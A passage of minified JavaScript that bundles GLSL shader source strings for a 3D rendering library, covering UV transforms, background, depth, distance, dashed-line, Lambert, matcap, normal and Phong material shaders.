		vec3 attenuatedColor = transmittance * transmittedLight.rgb;
		vec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );
		float transmittanceFactor = ( transmittance.r + transmittance.g + transmittance.b ) / 3.0;
		return vec4( ( 1.0 - F ) * attenuatedColor, 1.0 - ( 1.0 - transmittedLight.a ) * transmittanceFactor );
	}
#endif`,t1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_SPECULARMAP
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,n1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	uniform mat3 mapTransform;
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	uniform mat3 alphaMapTransform;
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	uniform mat3 lightMapTransform;
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	uniform mat3 aoMapTransform;
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	uniform mat3 bumpMapTransform;
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	uniform mat3 normalMapTransform;
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_DISPLACEMENTMAP
	uniform mat3 displacementMapTransform;
	varying vec2 vDisplacementMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	uniform mat3 emissiveMapTransform;
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	uniform mat3 metalnessMapTransform;
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	uniform mat3 roughnessMapTransform;
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	uniform mat3 anisotropyMapTransform;
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	uniform mat3 clearcoatMapTransform;
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform mat3 clearcoatNormalMapTransform;
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform mat3 clearcoatRoughnessMapTransform;
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	uniform mat3 sheenColorMapTransform;
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	uniform mat3 sheenRoughnessMapTransform;
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	uniform mat3 iridescenceMapTransform;
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform mat3 iridescenceThicknessMapTransform;
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SPECULARMAP
	uniform mat3 specularMapTransform;
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	uniform mat3 specularColorMapTransform;
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	uniform mat3 specularIntensityMapTransform;
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,i1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	vUv = vec3( uv, 1 ).xy;
#endif
#ifdef USE_MAP
	vMapUv = ( mapTransform * vec3( MAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ALPHAMAP
	vAlphaMapUv = ( alphaMapTransform * vec3( ALPHAMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_LIGHTMAP
	vLightMapUv = ( lightMapTransform * vec3( LIGHTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_AOMAP
	vAoMapUv = ( aoMapTransform * vec3( AOMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_BUMPMAP
	vBumpMapUv = ( bumpMapTransform * vec3( BUMPMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_NORMALMAP
	vNormalMapUv = ( normalMapTransform * vec3( NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_DISPLACEMENTMAP
	vDisplacementMapUv = ( displacementMapTransform * vec3( DISPLACEMENTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_EMISSIVEMAP
	vEmissiveMapUv = ( emissiveMapTransform * vec3( EMISSIVEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_METALNESSMAP
	vMetalnessMapUv = ( metalnessMapTransform * vec3( METALNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ROUGHNESSMAP
	vRoughnessMapUv = ( roughnessMapTransform * vec3( ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ANISOTROPYMAP
	vAnisotropyMapUv = ( anisotropyMapTransform * vec3( ANISOTROPYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOATMAP
	vClearcoatMapUv = ( clearcoatMapTransform * vec3( CLEARCOATMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	vClearcoatNormalMapUv = ( clearcoatNormalMapTransform * vec3( CLEARCOAT_NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	vClearcoatRoughnessMapUv = ( clearcoatRoughnessMapTransform * vec3( CLEARCOAT_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCEMAP
	vIridescenceMapUv = ( iridescenceMapTransform * vec3( IRIDESCENCEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	vIridescenceThicknessMapUv = ( iridescenceThicknessMapTransform * vec3( IRIDESCENCE_THICKNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_COLORMAP
	vSheenColorMapUv = ( sheenColorMapTransform * vec3( SHEEN_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	vSheenRoughnessMapUv = ( sheenRoughnessMapTransform * vec3( SHEEN_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULARMAP
	vSpecularMapUv = ( specularMapTransform * vec3( SPECULARMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_COLORMAP
	vSpecularColorMapUv = ( specularColorMapTransform * vec3( SPECULAR_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	vSpecularIntensityMapUv = ( specularIntensityMapTransform * vec3( SPECULAR_INTENSITYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_TRANSMISSIONMAP
	vTransmissionMapUv = ( transmissionMapTransform * vec3( TRANSMISSIONMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_THICKNESSMAP
	vThicknessMapUv = ( thicknessMapTransform * vec3( THICKNESSMAP_UV, 1 ) ).xy;
#endif`,s1=`#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION ) || NUM_SPOT_LIGHT_COORDS > 0
	vec4 worldPosition = vec4( transformed, 1.0 );
	#ifdef USE_BATCHING
		worldPosition = batchingMatrix * worldPosition;
	#endif
	#ifdef USE_INSTANCING
		worldPosition = instanceMatrix * worldPosition;
	#endif
	worldPosition = modelMatrix * worldPosition;
#endif`;const r1=`varying vec2 vUv;
uniform mat3 uvTransform;
void main() {
	vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	gl_Position = vec4( position.xy, 1.0, 1.0 );
}`,a1=`uniform sampler2D t2D;
uniform float backgroundIntensity;
varying vec2 vUv;
void main() {
	vec4 texColor = texture2D( t2D, vUv );
	#ifdef DECODE_VIDEO_TEXTURE
		texColor = vec4( mix( pow( texColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), texColor.rgb * 0.0773993808, vec3( lessThanEqual( texColor.rgb, vec3( 0.04045 ) ) ) ), texColor.w );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,o1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,l1=`#ifdef ENVMAP_TYPE_CUBE
	uniform samplerCube envMap;
#elif defined( ENVMAP_TYPE_CUBE_UV )
	uniform sampler2D envMap;
#endif
uniform float flipEnvMap;
uniform float backgroundBlurriness;
uniform float backgroundIntensity;
uniform mat3 backgroundRotation;
varying vec3 vWorldDirection;
#include <cube_uv_reflection_fragment>
void main() {
	#ifdef ENVMAP_TYPE_CUBE
		vec4 texColor = textureCube( envMap, backgroundRotation * vec3( flipEnvMap * vWorldDirection.x, vWorldDirection.yz ) );
	#elif defined( ENVMAP_TYPE_CUBE_UV )
		vec4 texColor = textureCubeUV( envMap, backgroundRotation * vWorldDirection, backgroundBlurriness );
	#else
		vec4 texColor = vec4( 0.0, 0.0, 0.0, 1.0 );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,c1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,u1=`uniform samplerCube tCube;
uniform float tFlip;
uniform float opacity;
varying vec3 vWorldDirection;
void main() {
	vec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );
	gl_FragColor = texColor;
	gl_FragColor.a *= opacity;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,d1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
varying vec2 vHighPrecisionZW;
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vHighPrecisionZW = gl_Position.zw;
}`,p1=`#if DEPTH_PACKING == 3200
	uniform float opacity;
#endif
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
varying vec2 vHighPrecisionZW;
void main() {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#if DEPTH_PACKING == 3200
		diffuseColor.a = opacity;
	#endif
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <logdepthbuf_fragment>
	#ifdef USE_REVERSED_DEPTH_BUFFER
		float fragCoordZ = vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ];
	#else
		float fragCoordZ = 0.5 * vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ] + 0.5;
	#endif
	#if DEPTH_PACKING == 3200
		gl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );
	#elif DEPTH_PACKING == 3201
		gl_FragColor = packDepthToRGBA( fragCoordZ );
	#elif DEPTH_PACKING == 3202
		gl_FragColor = vec4( packDepthToRGB( fragCoordZ ), 1.0 );
	#elif DEPTH_PACKING == 3203
		gl_FragColor = vec4( packDepthToRG( fragCoordZ ), 0.0, 1.0 );
	#endif
}`,h1=`#define DISTANCE
varying vec3 vWorldPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <worldpos_vertex>
	#include <clipping_planes_vertex>
	vWorldPosition = worldPosition.xyz;
}`,f1=`#define DISTANCE
uniform vec3 referencePosition;
uniform float nearDistance;
uniform float farDistance;
varying vec3 vWorldPosition;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <clipping_planes_pars_fragment>
void main () {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	float dist = length( vWorldPosition - referencePosition );
	dist = ( dist - nearDistance ) / ( farDistance - nearDistance );
	dist = saturate( dist );
	gl_FragColor = vec4( dist, 0.0, 0.0, 1.0 );
}`,m1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
}`,g1=`uniform sampler2D tEquirect;
varying vec3 vWorldDirection;
#include <common>
void main() {
	vec3 direction = normalize( vWorldDirection );
	vec2 sampleUV = equirectUv( direction );
	gl_FragColor = texture2D( tEquirect, sampleUV );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,v1=`uniform float scale;
attribute float lineDistance;
varying float vLineDistance;
#include <common>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	vLineDistance = scale * lineDistance;
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,_1=`uniform vec3 diffuse;
uniform float opacity;
uniform float dashSize;
uniform float totalSize;
varying float vLineDistance;
#include <common>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	if ( mod( vLineDistance, totalSize ) > dashSize ) {
		discard;
	}
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,x1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinbase_vertex>
		#include <skinnormal_vertex>
		#include <defaultnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <fog_vertex>
}`,y1=`uniform vec3 diffuse;
uniform float opacity;
#ifndef FLAT_SHADED
	varying vec3 vNormal;
#endif
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		reflectedLight.indirectDiffuse += lightMapTexel.rgb * lightMapIntensity * RECIPROCAL_PI;
	#else
		reflectedLight.indirectDiffuse += vec3( 1.0 );
	#endif
	#include <aomap_fragment>
	reflectedLight.indirectDiffuse *= diffuseColor.rgb;
	vec3 outgoingLight = reflectedLight.indirectDiffuse;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,S1=`#define LAMBERT
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,b1=`#define LAMBERT
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_lambert_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_lambert_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,w1=`#define MATCAP
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <displacementmap_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
	vViewPosition = - mvPosition.xyz;
}`,M1=`#define MATCAP
uniform vec3 diffuse;
uniform float opacity;
uniform sampler2D matcap;
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	vec3 viewDir = normalize( vViewPosition );
	vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );
	vec3 y = cross( viewDir, x );
	vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;
	#ifdef USE_MATCAP
		vec4 matcapColor = texture2D( matcap, uv );
	#else
		vec4 matcapColor = vec4( vec3( mix( 0.2, 0.8, uv.y ) ), 1.0 );
	#endif
	vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,E1=`#define NORMAL
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	vViewPosition = - mvPosition.xyz;
#endif
}`,T1=`#define NORMAL
uniform float opacity;
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <uv_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( 0.0, 0.0, 0.0, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	gl_FragColor = vec4( normalize( normal ) * 0.5 + 0.5, diffuseColor.a );
	#ifdef OPAQUE
		gl_FragColor.a = 1.0;
	#endif
}`,A1=`#define PHONG
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,C1=`#define PHONG
uniform vec3 diffuse;
uniform vec3 emissive;
uniform vec3 specular;
uniform float shininess;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_phong_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_phong_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
